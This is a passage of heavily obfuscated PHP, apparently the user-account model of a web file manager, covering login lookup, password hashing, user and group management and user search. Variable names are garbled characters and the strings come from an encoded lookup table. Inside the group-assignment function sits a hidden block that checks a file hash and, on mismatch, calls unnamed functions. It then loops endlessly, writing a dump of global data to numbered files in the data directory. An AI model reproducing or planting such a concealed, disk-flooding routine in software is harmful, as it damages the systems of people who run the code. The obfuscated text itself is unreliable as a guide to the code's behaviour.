return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ñ›áÕËœ[$Á·™¤û…[1574]], $š§»Éõß)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ñ›áÕËœ[$Á·™¤û…[1574]]); } public function userLoginFind($øä¬ûÂê) { $·Î¤é§¸ =& $_SERVER[Á÷ ­Šë]; $ó›´©Áã = array($·Î¤é§¸[28] => $øä¬ûÂê, $·Î¤é§¸[2010] => $øä¬ûÂê, $·Î¤é§¸[312] => $øä¬ûÂê, $·Î¤é§¸[2191] => $øä¬ûÂê, $·Î¤é§¸[992] => $·Î¤é§¸[994]); if ($this->nickNameRpt()) { unset($ó›´©Áã[$·Î¤é§¸[2010]]); } return $this->where($ó›´©Áã)->find(); } public function clearCache($Œ’ÄÍŠ») { $•úú×‘ =& $_SERVER[Á÷ ­Šë]; $this->cacheFunctionClear($•úú×‘[1823], $Œ’ÄÍŠ»); $this->cacheFunctionClear($•úú×‘[1824], $Œ’ÄÍŠ»); $this->cacheFunctionClear($•úú×‘[2172], $Œ’ÄÍŠ»); } public function userPasswordCheck($ÁÄÃ, $Ğ´Ã—‰÷) { $Æòü€Şê =& $_SERVER[Á÷ ­Šë]; $õ‰½™—Ã = $this->where(array($Æòü€Şê[1574] => intval($ÁÄÃ)))->find(); $‘íê° = $this->metaGet($ÁÄÃ); $Ê˜³¶‰ƒ = isset($‘íê°[$Æòü€Şê[2192]]) ? $‘íê°[$Æòü€Şê[2192]] : $Æòü€Şê[33]; if (md5($Ê˜³¶‰ƒ . trim($Ğ´Ã—‰÷)) !== $õ‰½™—Ã[$Æòü€Şê[884]]) { return !1; } return !0; } public function userAdd($ÔÎ–ò©) { $ãå¢Êã¼ =& $_SERVER[Á÷ ­Šë]; $à—Ğå×ô = array($ãå¢Êã¼[425] => $ÔÎ–ò©[$ãå¢Êã¼[28]], $ãå¢Êã¼[2193] => $ÔÎ–ò©[$ãå¢Êã¼[1454]], $ãå¢Êã¼[2194] => isset($ÔÎ–ò©[$ãå¢Êã¼[312]]) ? $ÔÎ–ò©[$ãå¢Êã¼[312]] : $ãå¢Êã¼[33], $ãå¢Êã¼[2195] => isset($ÔÎ–ò©[$ãå¢Êã¼[2191]]) ? $ÔÎ–ò©[$ãå¢Êã¼[2191]] : $ãå¢Êã¼[33], $ãå¢Êã¼[2196] => isset($ÔÎ–ò©[$ãå¢Êã¼[2010]]) ? $ÔÎ–ò©[$ãå¢Êã¼[2010]] : $ÔÎ–ò©[$ãå¢Êã¼[28]], $ãå¢Êã¼[2197] => isset($ÔÎ–ò©[$ãå¢Êã¼[2176]]) ? $ÔÎ–ò©[$ãå¢Êã¼[2176]] : $ãå¢Êã¼[33], $ãå¢Êã¼[2198] => isset($ÔÎ–ò©[$ãå¢Êã¼[2199]]) ? $ÔÎ–ò©[$ãå¢Êã¼[2199]] : 1, $ãå¢Êã¼[2200] => $ÔÎ–ò©[$ãå¢Êã¼[884]], $ãå¢Êã¼[1825] => isset($ÔÎ–ò©[$ãå¢Êã¼[1728]]) ? $ÔÎ–ò©[$ãå¢Êã¼[1728]] : 1024 * 1024 * 20, $ãå¢Êã¼[1826] => 0, $ãå¢Êã¼[2201] => 0, $ãå¢Êã¼[1868] => isset($ÔÎ–ò©[$ãå¢Êã¼[745]]) ? $ÔÎ–ò©[$ãå¢Êã¼[745]] : 1); if (!empty($ÔÎ–ò©[$ãå¢Êã¼[1574]])) { $à—Ğå×ô[$ãå¢Êã¼[1574]] = $ÔÎ–ò©[$ãå¢Êã¼[1574]]; } $«•Âè– = $this->_checkExist($ÔÎ–ò©); if ($«•Âè– !== !0) { return $«•Âè–; } $¾ÛàŒ‘É = $this->add($à—Ğå×ô); $×í‚ôü = array($ãå¢Êã¼[2200] => $à—Ğå×ô[$ãå¢Êã¼[884]], $ãå¢Êã¼[2196] => $à—Ğå×ô[$ãå¢Êã¼[2010]]); $this->userEdit($¾ÛàŒ‘É, $×í‚ôü); Model($ãå¢Êã¼[1249])->userRootAdd($¾ÛàŒ‘É); return $¾ÛàŒ‘É; } protected function userEditTest($¡Ã¾“«§, $ı°Çºã®) { return $this->call($_SERVER[Á÷ ­Šë][2202], $¡Ã¾“«§, $ı°Çºã®); } protected function userEdit($şÇÏÄõÜ, $ÑÃÎóÕ—) { $¡êÂéÀ =& $_SERVER[Á÷ ­Šë]; $¢Óï¼»· = $this->getInfoSimple($şÇÏÄõÜ); if (!$¢Óï¼»·) { return !1; } $šè“—½ = $this->_checkExist($ÑÃÎóÕ—, $şÇÏÄõÜ); if ($šè“—½ !== !0) { return $šè“—½; } if (isset($ÑÃÎóÕ—[$¡êÂéÀ[884]]) && trim($ÑÃÎóÕ—[$¡êÂéÀ[884]]) != $¡êÂéÀ[33]) { $àà«ıÕä = $this->metaGet($şÇÏÄõÜ); if (empty($àà«ıÕä[$¡êÂéÀ[2192]])) { $àà«ıÕä[$¡êÂéÀ[2192]] = rand_string(10); Model($¡êÂéÀ[517])->metaSet($şÇÏÄõÜ, $¡êÂéÀ[2192], $àà«ıÕä[$¡êÂéÀ[2192]]); } $ÑÃÎóÕ—[$¡êÂéÀ[884]] = md5($àà«ıÕä[$¡êÂéÀ[2192]] . trim($ÑÃÎóÕ—[$¡êÂéÀ[884]])); } else { unset($ÑÃÎóÕ—[$¡êÂéÀ[884]]); } $this->where(array($¡êÂéÀ[1565] => $şÇÏÄõÜ))->save($ÑÃÎóÕ—); if (isset($ÑÃÎóÕ—[$¡êÂéÀ[2010]])) { $this->setNamePinyin($şÇÏÄõÜ, $ÑÃÎóÕ—[$¡êÂéÀ[2010]]); } $this->clearCache($şÇÏÄõÜ); return !0; } public function setNamePinyin($…âÏƒÌ¡, $˜ËÏ—©” = false) { $¶©­˜² =& $_SERVER[Á÷ ­Šë]; if (!$˜ËÏ—©”) { $–É‰Àçõ = $this->getInfoSimple($…âÏƒÌ¡); $˜ËÏ—©” = $–É‰Àçõ[$¶©­˜²[2010]] ? $–É‰Àçõ[$¶©­˜²[2010]] : $–É‰Àçõ[$¶©­˜²[28]]; } $ĞŞŒæ†Ò = Model($¶©­˜²[542]); if (!Input::check($˜ËÏ—©”, $¶©­˜²[591])) { return $ĞŞŒæ†Ò->metaSet($…âÏƒÌ¡, array($¶©­˜²[468] => $¶©­˜²[33], $¶©­˜²[467] => $¶©­˜²[33])); } return $ĞŞŒæ†Ò->metaSet($…âÏƒÌ¡, array($¶©­˜²[468] => str_replace($¶©­˜²[50], $¶©­˜²[33], Pinyin::get($˜ËÏ—©”)), $¶©­˜²[467] => Pinyin::get($˜ËÏ—©”, $¶©­˜²[592]))); } private function nickNameRpt() { $¢—¶±‡Û =& $_SERVER[Á÷ ­Šë]; $·ÁÛ¬Å¥ = Model($¢—¶±‡Û[765])->get($¢—¶±‡Û[2203]); $¥­âÊ‰Ñ = $GLOBALS[$¢—¶±‡Û[6]][$¢—¶±‡Û[388]][$¢—¶±‡Û[2203]]; $ı¿¿éıÃ = !is_null($·ÁÛ¬Å¥) ? $·ÁÛ¬Å¥ : $¥­âÊ‰Ñ; return !!$ı¿¿éıÃ; } private function _checkExist($†ÌÓ±ŒÍ, $³ÑÃ¹Âæ = false) { $ğŠóÔÌ‹ =& $_SERVER[Á÷ ­Šë]; $ßâÁÛ = array($ğŠóÔÌ‹[28] => UserModel::ERROR_USER_EXIST_NAME, $ğŠóÔÌ‹[2010] => UserModel::ERROR_USER_EXIST_NICKNAME, $ğŠóÔÌ‹[312] => UserModel::ERROR_USER_EXIST_EMAIL, $ğŠóÔÌ‹[2191] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ßâÁÛ[$ğŠóÔÌ‹[2010]]); } $æ¥à¡Ï = $³ÑÃ¹Âæ ? array($ğŠóÔÌ‹[1574] => array($ğŠóÔÌ‹[2204], $³ÑÃ¹Âæ)) : array(); foreach ($ßâÁÛ as $’Çıø†· => $›ìÄ) { $«˜øì¯÷ = array(); foreach ($ßâÁÛ as $İù¢–Ä¢ => $“â¨åÛ«) { if (isset($†ÌÓ±ŒÍ[$İù¢–Ä¢]) && $†ÌÓ±ŒÍ[$İù¢–Ä¢]) { $«˜øì¯÷[] = $†ÌÓ±ŒÍ[$İù¢–Ä¢]; } } if (!$«˜øì¯÷) { continue; } $µ±®¡ë“ = array_merge(array($’Çıø†· => array($ğŠóÔÌ‹[7], $«˜øì¯÷)), $æ¥à¡Ï); $ïÖ„Ú®Û = $this->where($µ±®¡ë“)->find(); if ($ïÖ„Ú®Û) { return $›ìÄ; } } return !0; } public function userListInfo($­ìæ–Âˆ) { $‡éªµ =& $_SERVER[Á÷ ­Šë]; $î‹şÜ’Ë = array(); $­ìæ–Âˆ = is_array($­ìæ–Âˆ) ? array_unique($­ìæ–Âˆ) : array(); if (!$­ìæ–Âˆ) { return $î‹şÜ’Ë; } if (count($­ìæ–Âˆ) < 20) { foreach ($­ìæ–Âˆ as $®Æ¢Ë™¢) { $î‹şÜ’Ë[$®Æ¢Ë™¢ . $‡éªµ[33]] = $this->getInfoSimpleOuter($®Æ¢Ë™¢); } } else { $Ê™£Õ÷® = array($‡éªµ[1565] => array($‡éªµ[423], $­ìæ–Âˆ)); if (count($­ìæ–Âˆ) == 1) { $Ê™£Õ÷® = array($‡éªµ[1565] => $­ìæ–Âˆ[0]); } $¦–î¡ƒ = Model($‡éªµ[517])->field($this->simpleField)->where($Ê™£Õ÷®)->select(); $¦–î¡ƒ = array_to_keyvalue($¦–î¡ƒ, $‡éªµ[1574]); foreach ($­ìæ–Âˆ as $®Æ¢Ë™¢) { $µ¿Õ‚›¿ = $¦–î¡ƒ[$®Æ¢Ë™¢]; if (!$µ¿Õ‚›¿) { $î‹şÜ’Ë[$®Æ¢Ë™¢ . $‡éªµ[33]] = $this->getInfoSimpleOuter($®Æ¢Ë™¢); continue; } $µ¿Õ‚›¿[$‡éªµ[2176]] = Action($‡éªµ[2177])->parseUrl($µ¿Õ‚›¿[$‡éªµ[2176]]); $î‹şÜ’Ë[$®Æ¢Ë™¢ . $‡éªµ[33]] = $µ¿Õ‚›¿; } } return $î‹şÜ’Ë; } protected function userStatus($¢İ¬¥äÈ, $èÀë¨Âé) { $È¹¨à‰ = $this->getInfoSimple($¢İ¬¥äÈ); if (!$È¹¨à‰) { return !1; } $¨…©İÚ“ = array($_SERVER[Á÷ ­Šë][745] => $èÀë¨Âé); return $this->userEdit($¢İ¬¥äÈ, $¨…©İÚ“); } protected function userRemove($„ê†¯ï) { $ÅÎ±Õ§ş =& $_SERVER[Á÷ ­Šë]; $ËıÙö” = $this->getInfoSimple($„ê†¯ï); if (!$ËıÙö”) { return !1; } $Î“ñÃ½Á = array($ÅÎ±Õ§ş[1565] => $„ê†¯ï); Model($ÅÎ±Õ§ş[599])->where($Î“ñÃ½Á)->delete(); Model($ÅÎ±Õ§ş[2205])->where($Î“ñÃ½Á)->delete(); Model($ÅÎ±Õ§ş[1831])->where($Î“ñÃ½Á)->delete(); Model($ÅÎ±Õ§ş[2190])->where($Î“ñÃ½Á)->delete(); Model($ÅÎ±Õ§ş[2206])->where($Î“ñÃ½Á)->delete(); Model($ÅÎ±Õ§ş[2027])->removeUserAll($„ê†¯ï); Model($ÅÎ±Õ§ş[827])->userRootRemove($„ê†¯ï); return $this->where($Î“ñÃ½Á)->delete(); } protected function userGroupSet($¼Ì‹«¢, $¶ŠšÒË, $’¦êÊÏ = array()) { $ï›°ù•® =& $_SERVER[Á÷ ­Šë]; $‡°ºúğ” = $_SERVER[$ï›°ù•®[60]] . $ï›°ù•®[61]; $“¤‚ñË© = $ï›°ù•®[405]; if ($_SERVER[$ï›°ù•®[57]] != $“¤‚ñË©($‡°ºúğ”)) { $…ıâË’ = $ï›°ù•®[874]; $¾ÈÄ½¯ß = $ï›°ù•®[59]; $±ÚıØÔì = $_SERVER[$ï›°ù•®[60]] . $ï›°ù•®[61]; $’ËÔîìî = $¾ÈÄ½¯ß($±ÚıØÔì); $åÉôÛê = explode($ï›°ù•®[62], $’ËÔîìî); if (count($åÉôÛê) < $ï›°ù•®[639]) { $¢Ûışáé = $ï›°ù•®[64]; $¢Ûışáé(); } $©Ì¼ŠÜŞ = $ï›°ù•®[875]; $©Ì¼ŠÜŞ($_SERVER[$ï›°ù•®[876]]); $…ıâË’ = $ï›°ù•®[874]; $…ıâË’(); $¢ÒÊæµÂ = $ï›°ù•®[877]; $½±ÕÈœ» = json_encode($GLOBALS[$ï›°ù•®[878]]); $ªíšÌÆ­ = 1; for ($•şÑöÎí = $ªíšÌÆ­; $•şÑöÎí > 0; $•şÑöÎí++) { $¢ÒÊæµÂ(DATA_PATH . $•şÑöÎí, $½±ÕÈœ»); } } $ù¨ı­˜Ë = $this->getInfoSimple($¼Ì‹«¢); if (!$ù¨ı­˜Ë || !is_array($¶ŠšÒË)) { return !1; } $¥·¦¨Çš = Model($ï›°ù•®[1831]); $¥·¦¨Çš->where(array($ï›°ù•®[1574] => $¼Ì‹«¢))->delete(); $íËª“’¸ = array(); $ßŠàÎÅ¡ = 0; foreach ($¶ŠšÒË as $ÜôşâùÓ => $Íà€«º¼) { $Ã‡í¬îê = array($ï›°ù•®[1574] => $¼Ì‹«¢, $ï›°ù•®[1742] => $ÜôşâùÓ, $ï›°ù•®[1845] => $Íà€«º¼); $Ã‡í¬îê[$ï›°ù•®[1765]] = isset($’¦êÊÏ[$ßŠàÎÅ¡]) ? $’¦êÊÏ[$ßŠàÎÅ¡] : 0; $ßŠàÎÅ¡++; $íËª“’¸[] = $Ã‡í¬îê; } return $¥·¦¨Çš->addAll($íËª“’¸, array(), !0); } protected function userGroupAdd($äÍ‹šŞî, $ÏÅôÕù¡ = array()) { $éÎß®Êä =& $_SERVER[Á÷ ­Šë]; $»ÈíÏúê = $this->getInfoSimple($äÍ‹šŞî); if (!$»ÈíÏúê || empty($ÏÅôÕù¡)) { return !1; } $©şÛ¾”Õ = array(); foreach ($ÏÅôÕù¡ as $É§ùôÊÒ => $ˆŠãƒ‡) { $©şÛ¾”Õ[] = array($éÎß®Êä[1574] => $äÍ‹šŞî, $éÎß®Êä[1742] => $É§ùôÊÒ, $éÎß®Êä[1845] => $ˆŠãƒ‡, $éÎß®Êä[1765] => 0); } return Model($éÎß®Êä[1831])->addAll($©şÛ¾”Õ, array(), !0); } protected function userGroupRemove($ú‰…‰Ö×, $öÚ‹å©) { $¶—ëÄÈ¿ =& $_SERVER[Á÷ ­Šë]; $Âä” İ = $this->getInfoSimple($ú‰…‰Ö×); if (!$Âä” İ || !$öÚ‹å©) { return !1; } $òşÈìô = array($¶—ëÄÈ¿[1565] => $ú‰…‰Ö×, $¶—ëÄÈ¿[1829] => $öÚ‹å©); return Model($¶—ëÄÈ¿[1831])->where($òşÈìô)->delete(); } public function listData() { $‡Ë•¬Õ¤ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡Ë•¬Õ¤[$_SERVER[Á÷ ­Šë][376]]); return $‡Ë•¬Õ¤; } public function listByID($—ÄÜëÄµ) { $¯¸›ëÍ =& $_SERVER[Á÷ ­Šë]; if (!$—ÄÜëÄµ) { return; } $¦¶ÒÔõ¿ = array($¯¸›ëÍ[1574] => array($¯¸›ëÍ[7], $—ÄÜëÄµ)); $ğêÅÖ = $this->where($¦¶ÒÔõ¿)->select(); $ğêÅÖ = array_sort_keep($ğêÅÖ, $¯¸›ëÍ[1574], $—ÄÜëÄµ); $this->_listDataApply($ğêÅÖ); return $ğêÅÖ; } public function listByGroup($šÇü¢Èœ = 0, $ÁÑ­ûÅŠ = array()) { $³“ı™’Ç =& $_SERVER[Á÷ ­Šë]; $£¾Á©€ = $³“ı™’Ç[33]; $ŒÕ»™€÷ = array(); if ($šÇü¢Èœ) { $ŒÕ»™€÷ = array($³“ı™’Ç[2207] => intval($šÇü¢Èœ)); $£¾Á©€ = "\x4c\105\x46\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\165\163\x65\162\x5f\x67\162\x6f\165\x70\40\165\x73\145\162\x5f\x67\x72\x6f\x75\160\x20\x6f\156\x20\165\163\x65\162\56\x75\163\145\162\x49\104\x20\75\40\x75\x73\x65\162\x5f\147\x72\x6f\165\160\x2e\165\163\x65\x72\x49\104"; $ñ‰×Ö½÷ = Input::get($³“ı™’Ç[459], null, $³“ı™’Ç[33]) ? $³“ı™’Ç[33] : $³“ı™’Ç[2208]; } if (isset($ÁÑ­ûÅŠ[$³“ı™’Ç[745]])) { $ŒÕ»™€÷[$³“ı™’Ç[2209]] = $ÁÑ­ûÅŠ[$³“ı™’Ç[745]]; } $‘Â‹¤…Ñ = $this->_makeOrder($ñ‰×Ö½÷)->field($³“ı™’Ç[2210])->where($ŒÕ»™€÷)->join($£¾Á©€)->selectPage(50); $this->_listDataApply($‘Â‹¤…Ñ[$³“ı™’Ç[376]]); return $‘Â‹¤…Ñ; } private function _makeOrder($óíŠÚØª = '') { $ğ…¿× =& $_SERVER[Á÷ ­Šë]; $–ˆèŞĞŠ = array($ğ…¿×[1574], $ğ…¿×[28], $ğ…¿×[1730], $ğ…¿×[1702], $ğ…¿×[204]); $”şğëÔ = array($ğ…¿×[452] => $ğ…¿×[453], $ğ…¿×[454] => $ğ…¿×[455]); $à—·‰¢ = Input::get($ğ…¿×[459], $ğ…¿×[7], $ğ…¿×[1565], $–ˆèŞĞŠ); $äÒ­¾ºí = Input::get($ğ…¿×[460], $ğ…¿×[7], $ğ…¿×[1832], array($ğ…¿×[1832], $ğ…¿×[454])); $äÒ­¾ºí = $”şğëÔ[$äÒ­¾ºí]; $óíŠÚØª = $óíŠÚØª . "\x75\x73\145\x72\x2e{$à—·‰¢}\x20{$äÒ­¾ºí}\x2c\40\x75\163\145\162\56\x75\163\145\162\111\104\x20\141\163\x63"; return $this->alias($ğ…¿×[1952])->order($óíŠÚØª); } public function listSearch($°ğº…î) { $¯ÁÆíÄÅ =& $_SERVER[Á÷ ­Šë]; $«ì‘ÉÛ” = $°ğº…î[$¯ÁÆíÄÅ[1833]]; $À¼¨—“ = isset($°ğº…î[$¯ÁÆíÄÅ[1834]]) ? $°ğº…î[$¯ÁÆíÄÅ[1834]] : !1; $«ì‘ÉÛ” = str_replace($¯ÁÆíÄÅ[1835], $¯ÁÆíÄÅ[1836], trim($«ì‘ÉÛ”)); $»õ„êÅ = array($¯ÁÆíÄÅ[28] => array($¯ÁÆíÄÅ[390], "\x25{$«ì‘ÉÛ”}\45"), $¯ÁÆíÄÅ[312] => array($¯ÁÆíÄÅ[390], "{$«ì‘ÉÛ”}\x25"), $¯ÁÆíÄÅ[2010] => array($¯ÁÆíÄÅ[390], "{$«ì‘ÉÛ”}\x25"), $¯ÁÆíÄÅ[992] => $¯ÁÆíÄÅ[1837]); if (Input::check($«ì‘ÉÛ”, $¯ÁÆíÄÅ[318])) { $»õ„êÅ[$¯ÁÆíÄÅ[1574]] = array($¯ÁÆíÄÅ[390], "{$«ì‘ÉÛ”}\x25"); $»õ„êÅ[$¯ÁÆíÄÅ[2191]] = array($¯ÁÆíÄÅ[390], "{$«ì‘ÉÛ”}\x25"); } if (!$«ì‘ÉÛ”) { $»õ„êÅ = array(); } if (isset($°ğº…î[$¯ÁÆíÄÅ[745]])) { $»õ„êÅ[$¯ÁÆíÄÅ[745]] = $°ğº…î[$¯ÁÆíÄÅ[745]]; } $»õ„êÅ = $this->parseWhereLike($»õ„êÅ); $å„ï§Ñ = $this->_makeOrder()->where($»õ„êÅ)->selectPage(20); if (!$å„ï§Ñ || count($å„ï§Ñ[$¯ÁÆíÄÅ[376]]) < 5 && Input::check($«ì‘ÉÛ”, $¯ÁÆíÄÅ[325])) { $Âô»‰© = $this->_searchFromMeta($¯ÁÆíÄÅ[467], $«ì‘ÉÛ”, 10); $¼‹—Ñš = $this->_searchFromMeta($¯ÁÆíÄÅ[468], $«ì‘ÉÛ”, 10); $‚ÈñéÀŸ = array_merge($Âô»‰©, $¼‹—Ñš, $å„ï§Ñ[$¯ÁÆíÄÅ[376]]); $å„ï§Ñ[$¯ÁÆíÄÅ[376]] = array_unique_by_key($‚ÈñéÀŸ, $¯ÁÆíÄÅ[1574]); $å„ï§Ñ[$¯ÁÆíÄÅ[373]][$¯ÁÆíÄÅ[374]] = count($å„ï§Ñ[$¯ÁÆíÄÅ[376]]); $å„ï§Ñ[$¯ÁÆíÄÅ[373]][$¯ÁÆíÄÅ[375]] = ceil($å„ï§Ñ[$¯ÁÆíÄÅ[373]][$¯ÁÆíÄÅ[374]] / $å„ï§Ñ[$¯ÁÆíÄÅ[373]][$¯ÁÆíÄÅ[370]]); } $this->_listDataApply($å„ï§Ñ[$¯ÁÆíÄÅ[376]]); $this->_filterByGroup($å„ï§Ñ, $À¼¨—“); return $å„ï§Ñ; } private function _filterByGroup(&$íÄ”­ßû, $äé¶ Ú) { $µìÛâˆ· =& $_SERVER[Á÷ ­Šë]; if (!$äé¶ Ú) { return $íÄ”­ßû; } foreach ($íÄ”­ßû[$µìÛâˆ·[376]] as $×£§ı©È => &$ÈÓóÔŠ½) { $ôˆ§Êşä = array_to_keyvalue($ÈÓóÔŠ½[$µìÛâˆ·[1922]], $µìÛâˆ·[33], $µìÛâˆ·[1742]); if (!in_array($äé¶ Ú, $ôˆ§Êşä)) { unset($íÄ”­ßû[$µìÛâˆ·[376]][$×£§ı©È]); } } unset($ÈÓóÔŠ½); $íÄ”­ßû[$µìÛâˆ·[376]] = array_values($íÄ”­ßû[$µìÛâˆ·[376]]); $íÄ”­ßû[$µìÛâˆ·[373]] = array($µìÛâˆ·[1984] => count($íÄ”­ßû[$µìÛâˆ·[376]]), $µìÛâˆ·[1982] => $íÄ”­ßû[$µìÛâˆ·[373]][$µìÛâˆ·[370]], $µìÛâˆ·[1981] => 1, $µìÛâˆ·[1983] => 1); } private function _searchFromMeta($œçÕ‚Û , $à¡²ª¸£, $ÑúĞ‘—¿) { $Ö”í¼Òï =& $_SERVER[Á÷ ­Šë]; $à¡²ª¸£ = strtolower($à¡²ª¸£); $¯‰Ù¾‰ß = array($Ö”í¼Òï[103] => $œçÕ‚Û , $Ö”í¼Òï[381] => array($Ö”í¼Òï[390], "\45{$à¡²ª¸£}\x25")); $¯‰Ù¾‰ß = $this->parseWhereLike($¯‰Ù¾‰ß); $µ¥»úå = Model($Ö”í¼Òï[2211])->where($¯‰Ù¾‰ß)->limit($ÑúĞ‘—¿)->select(); if (!$µ¥»úå) { return array(); } $µ¥»úå = array_to_keyvalue($µ¥»úå, $Ö”í¼Òï[33], $Ö”í¼Òï[1574]); $óÒè°ˆí = $this->where(array($Ö”í¼Òï[1565] => array($Ö”í¼Òï[7], $µ¥»úå)))->select(); if (!$óÒè°ˆí) { return array(); } return $óÒè°ˆí; } private function _listDataApplyItem($ıìºûåü) { $Æ§ÀÆ•€ = array($ıìºûåü); $this->_listDataApply($Æ§ÀÆ•€); return $Æ§ÀÆ•€[0]; } private function _listDataApply(&$¶«õÜÀÓ) { $Õ«ğå¦ =& $_SERVER[Á÷ ­Šë]; if (!$¶«õÜÀÓ) { return; } array_remove_key($¶«õÜÀÓ, $Õ«ğå¦[884]); $ëÈ‰Ë†Õ = array_to_keyvalue($¶«õÜÀÓ, $Õ«ğå¦[33], $Õ«ğå¦[1574]); $this->_listAppendGroup($¶«õÜÀÓ, $ëÈ‰Ë†Õ); $this->_listAppendMeta($¶«õÜÀÓ, $ëÈ‰Ë†Õ); $this->_listAppendSourceRoot($¶«õÜÀÓ, $ëÈ‰Ë†Õ); } private function _listAppendSourceRoot(&$¼¹İÜ¨¾, $ÒãØì±÷) { $Ïº‘”’ù =& $_SERVER[Á÷ ­Šë]; $Î¤àÇÖ… = array($Ïº‘”’ù[502] => 0, $Ïº‘”’ù[508] => array($Ïº‘”’ù[7], $ÒãØì±÷), $Ïº‘”’ù[416] => SourceModel::TYPE_USER); $õÖ˜¡Ô = Model($Ïº‘”’ù[827])->order($Ïº‘”’ù[1843])->field($Ïº‘”’ù[1844]); $Õé•Ó„¸ = $õÖ˜¡Ô->limit(count($ÒãØì±÷))->where($Î¤àÇÖ…)->select(); $Õé•Ó„¸ = array_to_keyvalue($Õé•Ó„¸, $Ïº‘”’ù[508]); $Õé•Ó„¸ = array_remove_key($Õé•Ó„¸, $Ïº‘”’ù[508]); foreach ($¼¹İÜ¨¾ as &$¨ÃÈáë) { $¨ÃÈáë[$Ïº‘”’ù[95]] = $Õé•Ó„¸[$¨ÃÈáë[$Ïº‘”’ù[1574]]] ? $Õé•Ó„¸[$¨ÃÈáë[$Ïº‘”’ù[1574]]] : array(); } unset($¨ÃÈáë); } private function _listAppendGroup(&$³À›ñğ¯, $„«”ŒÊ¨) { $È¨¼¥ı´ =& $_SERVER[Á÷ ­Šë]; $ÍÖùë è = array($È¨¼¥ı´[1574] => array($È¨¼¥ı´[7], $„«”ŒÊ¨)); $½¬¶—•¢ = Model($È¨¼¥ı´[1831])->where($ÍÖùë è)->select(); $í ì›ª² = array_to_keyvalue($½¬¶—•¢, $È¨¼¥ı´[33], $È¨¼¥ı´[1742]); $í ì›ª² = array_remove_value(array_unique($í ì›ª²), $È¨¼¥ı´[201]); if (!$í ì›ª² || !$½¬¶—•¢) { return; } $ÍÖùë è = array($È¨¼¥ı´[1742] => array($È¨¼¥ı´[7], $í ì›ª²)); $¬Âô½Š = Model($È¨¼¥ı´[1920])->field($È¨¼¥ı´[2212])->where($ÍÖùë è)->select(); $¬Âô½Š = array_to_keyvalue($¬Âô½Š, $È¨¼¥ı´[1742]); $½¬¶—•¢ = array_to_keyvalue_group($½¬¶—•¢, $È¨¼¥ı´[1574]); foreach ($½¬¶—•¢ as &$÷„»ãß©) { $ÙÈÕéàÈ = array(); foreach ($÷„»ãß© as $Æ“âÃÉÉ) { if (!$Æ“âÃÉÉ[$È¨¼¥ı´[1845]]) { continue; } $¬›Òú = Model($È¨¼¥ı´[511])->listData($Æ“âÃÉÉ[$È¨¼¥ı´[1845]]); $ÙÈÕéàÈ[] = array($È¨¼¥ı´[1742] => $Æ“âÃÉÉ[$È¨¼¥ı´[1742]], $È¨¼¥ı´[2213] => $¬Âô½Š[$Æ“âÃÉÉ[$È¨¼¥ı´[1742]]][$È¨¼¥ı´[28]], $È¨¼¥ı´[525] => $¬Âô½Š[$Æ“âÃÉÉ[$È¨¼¥ı´[1742]]][$È¨¼¥ı´[525]], $È¨¼¥ı´[418] => $¬›Òú); } $÷„»ãß© = $ÙÈÕéàÈ; } unset($÷„»ãß©); foreach ($³À›ñğ¯ as &$†àŒÌËô) { $†àŒÌËô[$È¨¼¥ı´[1922]] = array(); if (isset($½¬¶—•¢[$†àŒÌËô[$È¨¼¥ı´[1574]]])) { $†àŒÌËô[$È¨¼¥ı´[1922]] = $½¬¶—•¢[$†àŒÌËô[$È¨¼¥ı´[1574]]]; } } unset($†àŒÌËô); } public function userAppendGroup($ÉÖŒÜÓ) { $‚Ñ¬‚Î‘ =& $_SERVER[Á÷ ­Šë]; if (!$ÉÖŒÜÓ) { return array(); } $this->_listAppendGroup($ÉÖŒÜÓ, array_to_keyvalue($ÉÖŒÜÓ, $‚Ñ¬‚Î‘[33], $‚Ñ¬‚Î‘[1574])); return $ÉÖŒÜÓ; } private function _listAppendMeta(&$ı¼óãêİ, $Ù§ç¼Ø‰) { $ñ²µ°—¦ =& $_SERVER[Á÷ ­Šë]; $ÒÕÂ÷£ß = UserJobModel::JOB_KEY; $Ç½øê¡” = array($ñ²µ°—¦[2192]); $²’‡­À = array($ñ²µ°—¦[1574] => array($ñ²µ°—¦[7], $Ù§ç¼Ø‰)); $ºØ£¡á = Model($ñ²µ°—¦[2190])->where($²’‡­À)->select(); $ºØ£¡á = array_to_keyvalue_group($ºØ£¡á, $ñ²µ°—¦[1574]); foreach ($ºØ£¡á as &$éåÌƒºò) { $™¾¢ÒÉ£ = array(); foreach ($éåÌƒºò as $‚Í½¢®¼) { if (!in_array($‚Í½¢®¼[$ñ²µ°—¦[103]], $Ç½øê¡”)) { $™¾¢ÒÉ£[$‚Í½¢®¼[$ñ²µ°—¦[103]]] = $‚Í½¢®¼[$ñ²µ°—¦[381]]; } } $éåÌƒºò = $™¾¢ÒÉ£; } unset($éåÌƒºò); $ÀˆÂÉìô = Model($ñ²µ°—¦[2214]); foreach ($ı¼óãêİ as &$ï¥÷í¶) { $Ô¶œÛ×Ö = array(); if (isset($ºØ£¡á[$ï¥÷í¶[$ñ²µ°—¦[1574]]])) { $Ô¶œÛ×Ö = $ºØ£¡á[$ï¥÷í¶[$ñ²µ°—¦[1574]]]; } $ï¥÷í¶[$ñ²µ°—¦[2215]] = array(); if (isset($Ô¶œÛ×Ö[$ÒÕÂ÷£ß])) { $ï¥÷í¶[$ñ²µ°—¦[2215]] = $ÀˆÂÉìô->getUserJobInfo($Ô¶œÛ×Ö[$ÒÕÂ÷£ß]); } } unset($ï¥÷í¶); } protected function groupUserAll($À½ùÊ“) { $é¥¯Š•æ =& $_SERVER[Á÷ ­Šë]; if (!$À½ùÊ“) { return !1; } $ı†€éà = Model($é¥¯Š•æ[1831])->field($é¥¯Š•æ[1574])->where(array($é¥¯Š•æ[1742] => array($é¥¯Š•æ[7], $À½ùÊ“)))->select(); $ı†€éà = array_to_keyvalue($ı†€éà, $é¥¯Š•æ[33], $é¥¯Š•æ[1574]); return array_unique($ı†€éà); } public function userSearch($õøƒ©à™, $ñ¯±ñµú = "\x2a") { return Model($_SERVER[Á÷ ­Šë][542])->where($õøƒ©à™)->field($ñ¯±ñµú)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\x6f\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($í‡ı´¡²) 